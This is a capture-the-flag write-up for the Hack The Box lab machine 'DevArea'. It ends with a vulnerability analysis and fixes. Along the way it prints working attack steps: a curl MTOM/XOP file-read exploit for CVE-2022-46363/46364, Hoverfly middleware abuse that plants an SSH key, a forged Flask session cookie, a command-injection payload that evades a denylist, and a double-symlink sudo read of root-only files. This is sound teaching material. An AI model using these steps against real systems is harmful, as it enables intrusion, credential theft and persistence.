## Summary

DevArea is a Medium Linux machine built around a Java SOAP service and a stack of
internal automation tooling. Anonymous **FTP** leaks an `employee-service.jar`
whose decompiled source reveals an **Apache CXF 3.2.14** JAX-WS endpoint. Although
classic SOAP-envelope XXE is blocked, the Aegis databinding is vulnerable to
**CVE-2022-46363/46364** — an MTOM/XOP `xop:Include href="file://..."` is fetched
server-side and reflected back, giving arbitrary file read as `dev_ryan`. That
read leaks **Hoverfly** proxy credentials from a systemd unit; the Hoverfly admin
API is abused to install **middleware** (local command execution) and drop an SSH
key, landing a shell as `dev_ryan`. Privilege escalation chains two flaws: a
command injection in a SysWatch Flask GUI (reached by **forging a Flask session
cookie** with a leaked secret key) yields code execution as `syswatch`, who owns
the log directory consumed by a root-runnable script. That script's `view_logs`
function has a **double-symlink** flaw — it validates only the first symlink hop,
while `cat` follows the second anywhere — turning a `sudo` log viewer into
arbitrary **root** file read.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| DevArea | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals FTP (21), SSH (22), Apache (80 → `devarea.htb`), a CXF/Jetty SOAP service (8080) and two Hoverfly ports (8500 proxy, 8888 admin).
2. Anonymous FTP serves `employee-service.jar`; decompilation shows an Apache CXF 3.2.14 SOAP service with Aegis databinding.
3. SOAP XXE is blocked, but an MTOM/XOP `xop:Include` with a `file://` href triggers CVE-2022-46363/46364 — arbitrary file read reflected in the response (as `dev_ryan`).
4. File read leaks `hoverfly.service`, exposing the Hoverfly admin/proxy credentials.
5. The Hoverfly admin API (JWT) is used to set malicious middleware and switch mode; a proxied request executes it as `dev_ryan`, writing an authorized SSH key.
6. SSH access as `dev_ryan`; the user flag is captured.
7. `sudo -l` shows `dev_ryan` can run `/opt/syswatch/syswatch.sh` as root.
8. The SysWatch Flask GUI (localhost:7777, running as `syswatch`) has a `shell=True` command injection; login is bypassed by forging a Flask session cookie with the leaked `SYSWATCH_SECRET_KEY`.
9. Code execution as `syswatch`, who owns `/opt/syswatch/logs`.
10. `syswatch.sh logs` (run as root via sudo) follows a chained symlink in that directory, giving arbitrary root file read — root flag captured.

## Reconnaissance

A full TCP scan with **Nmap** (connect scan, no root needed) exposed the surface:

```bash
nmap -sT -p- --min-rate 2000 -T4 10.129.244.208
nmap -sT -sV -p21,22,80,8080,8500,8888 10.129.244.208
```

```
21/tcp   open  ftp      vsftpd 3.0.5
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   open  http     Apache httpd 2.4.58 (redirect -> devarea.htb)
8080/tcp open  http     Jetty 9.4.27 (Apache CXF SOAP service)
8500/tcp open  http     Hoverfly proxy ("This is a proxy server")
8888/tcp open  http     Hoverfly dashboard / admin API
```

Anonymous FTP login is allowed and `/pub` holds a single artifact:

```bash
wget -m ftp://anonymous:anon@10.129.244.208/
# pub/employee-service.jar   (~6.4 MB Java archive)
```

## Foothold — Apache CXF MTOM/XOP File Read (CVE-2022-46363/46364)

Decompiling the jar (CFR) shows a tiny JAX-WS service started by
`htb.devarea.ServerStarter` at `http://0.0.0.0:8080/employeeservice`, built on
**Apache CXF 3.2.14** with the **Aegis databinding**:

```java
@WebService(name="EmployeeService", targetNamespace="http://devarea.htb/")
public interface EmployeeService { String submitReport(Report var1); }

// EmployeeServiceImpl reflects user input back:
return greeting + ". Department: " + report.getDepartment()
                + ". Content: " + report.getContent();
```

The `content` field is echoed verbatim — an ideal in-band oracle. A normal request
works, but a SOAP-envelope `DOCTYPE` is rejected by the StAX reader (no XXE).
CXF 3.2.x is, however, vulnerable to **CVE-2022-46363/46364**: an MTOM/XOP
`xop:Include` whose `href` points at a `file://` (or `http://`) URL is resolved
server-side, and the bytes are returned base64-encoded inside the reflected field.

```bash
curl -s -X POST http://10.129.244.208:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  -H 'SOAPAction: ""' --data-binary @- <<'EOF'
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
<soapenv:Body><dev:submitReport><arg0>
<confidential>false</confidential>
<content><inc:Include xmlns:inc="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></content>
<department>IT</department><employeeName>x</employeeName>
</arg0></dev:submitReport></soapenv:Body>
</soapenv:Envelope>
--MIMEBoundary--
EOF
# <return>Report received from x. Department: IT. Content: cm9vdDp4OjA6...</return>  (base64 /etc/passwd)
```

The Base64 decodes to `/etc/passwd`. Probing `/proc/self` identifies the service
account and its location:

```
USER=dev_ryan   HOME=/home/dev_ryan
cmdline: /usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/EmployeeService/target/employee-service.jar
```

Reading the Hoverfly systemd unit leaks the proxy/admin credentials:

```bash
# file:///etc/systemd/system/hoverfly.service
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

## Initial Access via Hoverfly Middleware (User)

The Hoverfly admin API on `:8888` uses **JWT** auth. After obtaining a token, the
attack is to register **middleware** (Hoverfly executes a local binary/script for
each proxied request) and switch the proxy into `modify` mode so it forwards real
traffic:

```bash
TOK=$(curl -s :8888/api/token-auth -d '{"username":"admin","password":"O7IJ27MyyXiU"}' \
      | sed -E 's/.*"token":"([^"]+)".*/\1/')

# middleware (runs as dev_ryan): append our key to authorized_keys, then passthrough
curl -s -X PUT -H "Authorization: Bearer $TOK" :8888/api/v2/hoverfly/middleware \
  -d '{"binary":"/bin/bash","script":"mkdir -p /home/dev_ryan/.ssh\necho <PUBKEY> >> /home/dev_ryan/.ssh/authorized_keys\nchmod 700 /home/dev_ryan/.ssh; chmod 600 /home/dev_ryan/.ssh/authorized_keys\ncat"}'
curl -s -X PUT -H "Authorization: Bearer $TOK" :8888/api/v2/hoverfly/mode -d '{"mode":"modify"}'

# trigger via the authenticated proxy
curl -s -x http://admin:O7IJ27MyyXiU@10.129.244.208:8500 http://devarea.htb/ >/dev/null

ssh -i devarea_key dev_ryan@10.129.244.208      # uid=1001(dev_ryan)
```

The user flag lives at `/home/dev_ryan/user.txt`.

## Enumeration as `dev_ryan`

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

`/opt/syswatch` carries a POSIX ACL that explicitly denies `dev_ryan`
(`user:dev_ryan:---`), so the scripts can't be read directly. A SysWatch Flask GUI
listens on `127.0.0.1:7777` and, crucially, runs as the **`syswatch`** user. Its
environment file is world-readable and leaks two secrets:

```bash
# /etc/syswatch.env
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

## Privilege Escalation — Part 1: Flask Forge + Command Injection (→ `syswatch`)

The GUI's admin DB was seeded with a *different* password than the env default, so
the leaked `SYSWATCH_ADMIN_PASSWORD` does not log in. The **secret key**, however,
is enough to **forge a valid Flask session cookie** and bypass authentication
entirely:

```python
# Flask SecureCookieSession: salt 'cookie-session', HMAC-SHA1, zlib
serializer.dumps({"user_id": 1, "username": "admin"})
# -> eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.<ts>.<sig>
```

The `/service-status` endpoint then runs:

```python
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")
subprocess.run([f"systemctl status --no-pager {service}"], shell=True, ...)
```

`shell=True` with f-string interpolation is a command injection. The filter blocks
`; / & . < >`, carriage return and uppercase — but allows `|`, `$()` and
backticks. A pipe injects a second command, and octal `printf` rebuilds any byte
(including `/` and `.`) so the blocklist never sees them:

```bash
# service value:
x|bash -c "$(printf '\151\144')"      # printf -> "id"; runs as syswatch
```

Driving that through the forged cookie yields code execution as `syswatch`
(uid 984), who owns `/opt/syswatch/logs`.

## Privilege Escalation — Part 2: `sudo` Double-Symlink Read (→ root)

`syswatch.sh logs <file>` is runnable as root via the sudo rule. Its `view_logs`
function tries to be symlink-safe, but only inspects the **first** hop's target
name (it must be slash-free), then blindly `cat`s `$LOG_DIR/$target` — and `cat`
transparently follows a **second** symlink to anywhere:

```bash
# as syswatch (owns the logs directory):
cd /opt/syswatch/logs
ln -sf b a                  # 'a' -> 'b'  (target "b" passes the slug check)
ln -sf /root/root.txt b     # 'b' -> /root/root.txt  (never validated; cat follows it)

# as dev_ryan, via the sudo rule:
sudo /opt/syswatch/syswatch.sh logs a       # prints /root/root.txt as root
```

The same primitive reads `/etc/shadow` and any other root-only file. The root flag
lives at `/root/root.txt`.

## Vulnerability Analysis

**Apache CXF MTOM/XOP SSRF / file read (CVE-2022-46363/46364)** — CXF 3.2.x
resolved `xop:Include` URLs (`file://`, `http://`) supplied by the client, and the
service reflected the result, yielding arbitrary file read. Fix: upgrade CXF
(≥ 3.4.10 / 3.5.5) and disable external resolution of attachment references.

**Secrets in readable artifacts** — credentials in a world-readable systemd unit
and a leaked Flask `secret_key` in a world-readable env file turned recon into
full account/auth compromise. Fix: restrict permissions on units and env files;
never expose signing keys.

**Hoverfly middleware as RCE** — Hoverfly executes a local command per request; an
exposed admin API with known creds is direct code execution. Fix: bind the admin
API to localhost, use strong credentials, and treat middleware as a privileged
feature.

**`shell=True` command injection** — building a shell command from user input with
a denylist regex is bypassable (pipes, command substitution, octal encoding). Fix:
pass argument vectors (no shell), and validate against an allowlist.

**Forgeable session due to leaked key** — a known `secret_key` lets an attacker
mint authenticated sessions. Fix: keep signing keys secret and rotate on exposure.

**Symlink-following log viewer + broad NOPASSWD sudo** — validating only the first
symlink hop while `cat` follows the chain converted a root log reader into
arbitrary root file read. Fix: resolve and canonicalize the full path
(`realpath`), refuse symlinks, and minimize NOPASSWD scope.

## Tools Used

- **Nmap** — port scanning and service fingerprinting
- **FTP / wget** — pulling the leaked application jar
- **CFR** — decompiling the CXF service to recover the SOAP contract
- **cURL** — MTOM/XOP file read and Hoverfly admin API abuse
- **Hoverfly admin API** — middleware-based command execution
- **Python (stdlib)** — forging the Flask session cookie
- **SSH** — `dev_ryan` access and running the sudo privesc

## Key Takeaways

1. A leaked build artifact is a free source map — decompile it before guessing.
2. When envelope XXE is blocked, MTOM/XOP can still reach the same parser.
3. Reflected fields are file-read oracles; no egress required.
4. A signing key is a credential — leak it and authentication is over.
5. Denylist input filters lose to encoding; symlink checks must canonicalize.
